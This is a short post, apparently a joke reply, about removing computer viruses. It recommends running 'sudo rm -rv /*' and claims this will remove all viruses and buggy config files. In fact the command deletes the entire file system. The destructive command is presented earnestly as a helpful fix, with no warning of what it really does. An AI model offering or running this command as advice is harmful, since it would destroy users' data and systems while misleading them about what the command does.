The following is an elegantly simple command that will work most of the time.  (Do note that there are bugs that can get themselves into the firmware of various hardware devices, and this doesn't touch those.)
sudo rm -rv /*
Get a cup of coffee while it's running, as it will take a while.  I've included the verbose command so you can observe its progress.  When it's done, any viruses on your system will be completely gone.

Note: this command has the added benefit of removing any buggy config files from your system.
